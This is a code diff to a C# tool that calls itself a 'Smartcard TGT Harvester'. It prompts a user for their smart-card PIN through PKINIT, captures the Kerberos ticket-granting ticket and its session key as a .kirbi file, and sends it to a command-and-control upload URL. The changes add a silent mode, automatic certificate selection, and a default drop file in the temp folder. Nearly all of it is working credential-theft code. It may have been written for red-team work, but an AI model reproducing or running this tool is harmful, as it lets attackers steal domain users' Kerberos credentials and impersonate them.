@@ -92,7 +92,7 @@ public class KerberosSmartCardAuthenticator
         return sortedKdcs;
     }
 
-    public X509Certificate2? FindSmartCardCertificate()
+    public List<X509Certificate2> FindAllSmartCardCertificates()
     {
         const string smartCardLogonOid = "1.3.6.1.4.1.311.20.2.2";
         var validCerts = new List<X509Certificate2>();
@@ -117,7 +117,6 @@ public class KerberosSmartCardAuthenticator
                 using var rsa = cert.GetRSAPrivateKey();
                 bool isSmartCard = false;
 
-                // CA1416: RSACryptoServiceProvider.CspKeyContainerInfo is Windows-only.
                 if (rsa is RSACryptoServiceProvider rsaCsp)
                 {
                     if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
@@ -137,8 +136,20 @@ public class KerberosSmartCardAuthenticator
             catch { /* Private key inaccessible */ }
         }
 
+        return validCerts;
+    }
+
+    public X509Certificate2? FindSmartCardCertificate()
+    {
+        return FindSmartCardCertificate(autoSelect: false);
+    }
+
+    public X509Certificate2? FindSmartCardCertificate(bool autoSelect)
+    {
+        var validCerts = FindAllSmartCardCertificates();
+
         if (validCerts.Count == 0) return null;
-        if (validCerts.Count == 1) return validCerts[0];
+        if (validCerts.Count == 1 || autoSelect) return validCerts[0];
         return SelectCertificateFromConsole(validCerts);
     }
 
@@ -155,7 +166,6 @@ public class KerberosSmartCardAuthenticator
 
     /// <summary>
     /// Cross-platform console certificate selector.
-    /// X509Certificate2UI (Windows-only)
     /// </summary>
     private static X509Certificate2 SelectCertificateFromConsole(List<X509Certificate2> certs)
     {
@@ -178,11 +188,9 @@ public class KerberosSmartCardAuthenticator
 
     /// <summary>
     /// Extracts the UPN from the Subject Alternative Name extension.
-    /// Uses the OS format API as a fast path, then falls back to raw DER parsing
     /// </summary>
     public string? GetUpnFromCertificate(X509Certificate2 cert)
     {
-        // OID 2.5.29.17 = Subject Alternative Name
         var sanExt = cert.Extensions
             .Cast<X509Extension>()
             .FirstOrDefault(e => e.Oid?.Value == "2.5.29.17");
@@ -209,14 +217,13 @@ public class KerberosSmartCardAuthenticator
 
     private static string? TryParseUpnFromRawSan(byte[] rawData)
     {
-        // OtherName OID for UPN: 1.3.6.1.4.1.311.20.2.3
         byte[] upnOid = { 0x2B, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x14, 0x02, 0x03 };
         int oidPos = FindBytes(rawData, upnOid);
         if (oidPos < 0) return null;
 
         for (int i = oidPos + upnOid.Length; i < rawData.Length - 2; i++)
         {
-            if (rawData[i] == 0x0C || rawData[i] == 0x16) // UTF8String or IA5String
+            if (rawData[i] == 0x0C || rawData[i] == 0x16)
             {
                 int len = rawData[i + 1];
                 if ((len & 0x80) != 0)
@@ -252,79 +259,270 @@ public class KerberosSmartCardAuthenticator
 
 public class Program
 {
-    public static async Task Main(string[] args)
+    private const int EXIT_SUCCESS = 0;
+    private const int EXIT_NO_SMARTCARD = 1;
+    private const int EXIT_AUTH_FAILED = 2;
+    private const int EXIT_OUTPUT_FAILED = 3;
+
+    private static bool _verbose = false;
+
+    private static void Log(string message)
     {
+        if (_verbose) Console.WriteLine(message);
+    }
+
+    private static void PrintUsage()
+    {
+        Console.WriteLine(@"Smarties - Smartcard TGT Harvester (PKINIT)
+
+Usage: smarties.exe <command> [options]
+
+Commands:
+  enum    Enumerate smartcard certificates and exit
+  phish   Trigger PKINIT auth (PIN prompt), capture TGT
+
+Options:
+  --output <path>   Write .kirbi to file (default: %TEMP%\<user>.kirbi)
+  --upload <url>    HTTP POST .kirbi to URL
+  --auto            Auto-select first smartcard cert (no interactive prompt)
+  --verbose         Enable debug output (default: quiet)
+
+Examples:
+  smarties.exe enum
+  smarties.exe phish --auto --upload https://c2.example.com/upload
+  smarties.exe phish --auto --output C:\loot\ticket.kirbi
+  smarties.exe phish --auto
+
+Exit codes: 0=success, 1=no smartcard, 2=auth failed, 3=output failed");
+    }
+
+    public static async Task<int> Main(string[] args)
+    {
+        string? command = null;
+        string? outputPath = null;
+        string? uploadUrl = null;
+        bool autoSelect = false;
+
+        for (int i = 0; i < args.Length; i++)
+        {
+            string arg = args[i].ToLowerInvariant();
+            switch (arg)
+            {
+                case "enum":
+                case "phish":
+                    command = arg;
+                    break;
+                case "--output":
+                case "-o":
+                    if (i + 1 < args.Length) outputPath = args[++i];
+                    break;
+                case "--upload":
+                case "-u":
+                    if (i + 1 < args.Length) uploadUrl = args[++i];
+                    break;
+                case "--auto":
+                case "-a":
+                    autoSelect = true;
+                    break;
+                case "--verbose":
+                case "-v":
+                    _verbose = true;
+                    break;
+                case "--help":
+                case "-h":
+                case "help":
+                    PrintUsage();
+                    return EXIT_SUCCESS;
+            }
+        }
+
+        // Suppress all Console output when not verbose.
+        // This silences both Program.cs Log() calls AND the debug
+        // Console.WriteLines in WindowsPkinitCredential.cs without
+        // modifying that file.
+        TextWriter originalOut = Console.Out;
+        if (!_verbose)
+        {
+            Console.SetOut(TextWriter.Null);
+        }
+
+        if (string.IsNullOrEmpty(command))
+        {
+            Console.SetOut(originalOut);
+            PrintUsage();
+            return EXIT_SUCCESS;
+        }
+
         var authenticator = new KerberosSmartCardAuthenticator();
 
-        Console.WriteLine("[*] Locating smart card certificate...");
-        X509Certificate2? certificate = authenticator.FindSmartCardCertificate();
+        if (command == "enum")
+        {
+            return RunEnum(authenticator, originalOut);
+        }
+
+        return await RunPhish(authenticator, autoSelect, outputPath, uploadUrl, originalOut);
+    }
+
+    private static int RunEnum(KerberosSmartCardAuthenticator authenticator, TextWriter output)
+    {
+        var certs = authenticator.FindAllSmartCardCertificates();
+
+        if (certs.Count == 0)
+        {
+            output.WriteLine("[!] No smartcard certificates found.");
+            return EXIT_NO_SMARTCARD;
+        }
+
+        output.WriteLine($"[+] Found {certs.Count} smartcard certificate(s):\n");
+        for (int i = 0; i < certs.Count; i++)
+        {
+            string? upn = authenticator.GetUpnFromCertificate(certs[i]);
+            output.WriteLine($"  [{i + 1}] Subject    : {certs[i].Subject}");
+            output.WriteLine($"      UPN        : {upn ?? "(none)"}");
+            output.WriteLine($"      Thumbprint : {certs[i].Thumbprint}");
+            output.WriteLine($"      Issuer     : {certs[i].Issuer}");
+            output.WriteLine($"      Valid      : {certs[i].NotBefore:yyyy-MM-dd} to {certs[i].NotAfter:yyyy-MM-dd}");
+            output.WriteLine();
+        }
+
+        foreach (var c in certs) c.Dispose();
+        return EXIT_SUCCESS;
+    }
+
+    private static async Task<int> RunPhish(
+        KerberosSmartCardAuthenticator authenticator,
+        bool autoSelect,
+        string? outputPath,
+        string? uploadUrl,
+        TextWriter output)
+    {
+        Log("[*] Locating smart card certificate...");
+        X509Certificate2? certificate = authenticator.FindSmartCardCertificate(autoSelect);
 
         if (certificate == null)
         {
-            Console.WriteLine("[!] No suitable smart card certificate found.");
-            return;
+            Log("[!] No suitable smart card certificate found.");
+            return EXIT_NO_SMARTCARD;
         }
 
         using (certificate)
         {
-            Console.WriteLine($"[+] Found certificate: {certificate.Subject}");
+            Log($"[+] Found certificate: {certificate.Subject}");
 
             string? upn = authenticator.GetUpnFromCertificate(certificate);
             if (string.IsNullOrEmpty(upn))
             {
-                Console.WriteLine("[!] Certificate does not contain a User Principal Name (UPN).");
-                return;
+                Log("[!] Certificate does not contain a UPN.");
+                return EXIT_NO_SMARTCARD;
             }
-            Console.WriteLine($"[+] UPN: {upn}");
+            Log($"[+] UPN: {upn}");
 
             string domain = upn.Split('@').Last();
-            Console.WriteLine($"[+] Domain: {domain}");
+            Log($"[+] Domain: {domain}");
 
-            Console.WriteLine("\n[*] Discovering KDCs (for logging purposes)...");
+            Log("[*] Discovering KDCs...");
             var kdcs = await authenticator.DiscoverAndSortKdcsAsync(domain);
             if (kdcs.Count > 0)
-                Console.WriteLine($"[+] Found {kdcs.Count} KDC(s). Highest priority: {kdcs.First().Target}");
+                Log($"[+] Found {kdcs.Count} KDC(s). Highest priority: {kdcs.First().Target}");
             else
-                Console.WriteLine("[!] No KDCs found via DNS SRV. KerberosClient will fall back to domain name resolution.");
+                Log("[!] No KDCs found via DNS SRV.");
 
-            Console.WriteLine("\n[*] Requesting TGT via PKINIT (PIN prompt may appear)...");
+            Log("[*] Requesting TGT via PKINIT (PIN prompt may appear)...");
+
+            byte[] kirbi;
             try
             {
-                byte[] kirbi = await RequestTgtViaPkinit(certificate, upn, domain);
-
-                Console.WriteLine($"[DBG] kirbi byte length: {kirbi?.Length ?? -1}");
-
-                if (kirbi == null || kirbi.Length == 0)
-                {
-                    Console.WriteLine("[-] kirbi bytes are null or empty — EncodeKirbi failed silently.");
-                    return;
-                }
-
-                using var http = new System.Net.Http.HttpClient();
-
-                var content = new System.Net.Http.MultipartFormDataContent();
-                content.Add(
-                    new System.Net.Http.ByteArrayContent(kirbi),
-                    "ticket",                            
-                    $"{upn.Split('@')[0]}.kirbi"         
-                );
-
-                Console.WriteLine("[*] Uploading TGT to http://192.168.100.1/upload ...");
-                var response = await http.PostAsync("http://192.168.100.1/upload", content);
-
-                Console.WriteLine($"[+] Server response: {(int)response.StatusCode} {response.ReasonPhrase}");
-                string body = await response.Content.ReadAsStringAsync();
-                if (!string.IsNullOrWhiteSpace(body))
-                    Console.WriteLine($"[+] Body: {body}");
+                kirbi = await RequestTgtViaPkinit(certificate, upn, domain);
             }
             catch (Exception ex)
             {
-                Console.WriteLine($"[-] TGT request failed: {ex.Message}");
+                Log($"[-] TGT request failed: {ex.Message}");
                 if (ex.InnerException != null)
-                    Console.WriteLine($"    Inner: {ex.InnerException.Message}");
-                Console.WriteLine($"    Stack: {ex.StackTrace}");
+                    Log($"    Inner: {ex.InnerException.Message}");
+                Log($"    Stack: {ex.StackTrace}");
+                return EXIT_AUTH_FAILED;
+            }
+
+            if (kirbi == null || kirbi.Length == 0)
+            {
+                Log("[-] kirbi bytes are null or empty.");
+                return EXIT_AUTH_FAILED;
+            }
+
+            Log($"[+] TGT captured ({kirbi.Length} bytes)");
+
+            bool writeFile = outputPath != null;
+            bool doUpload = uploadUrl != null;
+
+            // Default: write to %TEMP%\<samaccountname>.kirbi
+            if (!writeFile && !doUpload)
+            {
+                string tempDir = Environment.GetEnvironmentVariable("TEMP")
+                    ?? Environment.GetEnvironmentVariable("TMP")
+                    ?? Path.GetTempPath();
+                string username = upn.Split('@')[0];
+                outputPath = Path.Combine(tempDir, $"{username}.kirbi");
+                writeFile = true;
+            }
+
+            // Write .kirbi to file
+            if (writeFile && outputPath != null)
+            {
+                try
+                {
+                    string? dir = Path.GetDirectoryName(outputPath);
+                    if (!string.IsNullOrEmpty(dir) && !Directory.Exists(dir))
+                        Directory.CreateDirectory(dir);
+
+                    File.WriteAllBytes(outputPath, kirbi);
+                    Log($"[+] Wrote {kirbi.Length} bytes to {outputPath}");
+
+                    // Always print the file path even in quiet mode so
+                    // the operator knows where the ticket landed
+                    output.WriteLine(outputPath);
+                }
+                catch (Exception ex)
+                {
+                    Log($"[-] Failed to write .kirbi: {ex.Message}");
+                    return EXIT_OUTPUT_FAILED;
+                }
+            }
+
+            // HTTP upload
+            if (doUpload && uploadUrl != null)
+            {
+                try
+                {
+                    using var http = new HttpClient();
+                    http.Timeout = TimeSpan.FromSeconds(30);
+
+                    var content = new MultipartFormDataContent();
+                    content.Add(
+                        new ByteArrayContent(kirbi),
+                        "ticket",
+                        $"{upn.Split('@')[0]}.kirbi"
+                    );
+
+                    Log($"[*] Uploading TGT to {uploadUrl} ...");
+                    var response = await http.PostAsync(uploadUrl, content);
+
+                    Log($"[+] Server response: {((int)response.StatusCode)} {response.ReasonPhrase}");
+                    string body = await response.Content.ReadAsStringAsync();
+                    if (!string.IsNullOrWhiteSpace(body))
+                        Log($"[+] Body: {body}");
+
+                    if (!response.IsSuccessStatusCode)
+                        return EXIT_OUTPUT_FAILED;
+                }
+                catch (Exception ex)
+                {
+                    Log($"[-] Upload failed: {ex.Message}");
+                    return EXIT_OUTPUT_FAILED;
+                }
             }
         }
+
+        return EXIT_SUCCESS;
     }
 
     private static async Task<byte[]> RequestTgtViaPkinit(X509Certificate2 cert, string upn, string domain)
@@ -339,20 +537,8 @@ public class Program
         };
 
         using var client = new KerberosClient(config);
-
-        // AS-REQ / AS-REP — the CSP/KSP will prompt for the smart card PIN here
         await client.Authenticate(credential);
 
-        // <summary>
-        // Retrieve the TGT from the internal ticket cache
-        //
-        // GetCacheItem always returns an instance; when the key is absent the returned
-        // object has KdcResponse == null (same guard used inside KerberosClient itself).
-        //
-        // Cache key: KerberosClient.CacheTgt() stores the entry under
-        // kdcRep.Ticket.SName.FullyQualifiedName → "krbtgt/<REALM>".
-        // Windows AD KDCs return the realm in uppercase; MIT/Heimdal use lowercase.
-        // </summary>
         string realm = domain.ToUpperInvariant();
         string tgtKey = $"krbtgt/{realm}";
         var entry = client.Cache.GetCacheItem<KerberosClientCacheEntry>(tgtKey);
@@ -371,31 +557,18 @@ public class Program
         return EncodeKirbi(entry);
     }
 
-    /// <summary>
-    /// Encodes a cached TGT as a KRB-CRED (.kirbi) byte array
-    /// (client realm field per RFC 4120 §5.8.1)
-    /// </summary>
     private static byte[] EncodeKirbi(KerberosClientCacheEntry entry)
     {
-        // All KrbCredInfo fields except Key are OPTIONAL (RFC 4120 §5.8.1).
         var credInfo = new KrbCredInfo
         {
-            // Session key decrypted from the AS-REP enc-part; stored on the entry
             Key = entry.SessionKey,
-
             Realm = entry.KdcResponse.CRealm,
             PName = entry.KdcResponse.CName,
-
-            // Ticket flags and lifetime are stored directly on the entry (decrypted by
-            // KerberosClient from the AS-REP enc-part during Authenticate())
             Flags = entry.Flags,
             AuthTime = entry.AuthTime,
             StartTime = entry.StartTime,
             EndTime = entry.EndTime,
             RenewTill = entry.RenewTill,
-
-            // Service realm from the raw (opaque) ticket wrapper; service name from
-            // the entry directly — NOT from a non-existent .Server property.
             SRealm = entry.KdcResponse.Ticket.Realm,
             SName = entry.SName,
         };
@@ -405,12 +578,9 @@ public class Program
             TicketInfo = new[] { credInfo }
         };
 
-        // KrbPriv, and every other KRB message type in Kerberos.NET.
-        // EType = NULL signals that the Cipher is an unencrypted DER blob — the standard
         var krbCred = new KrbCred
         {
             Tickets = new[] { entry.KdcResponse.Ticket },
-
             EncryptedPart = new KrbEncryptedData
             {
                 EType = EncryptionType.NULL,
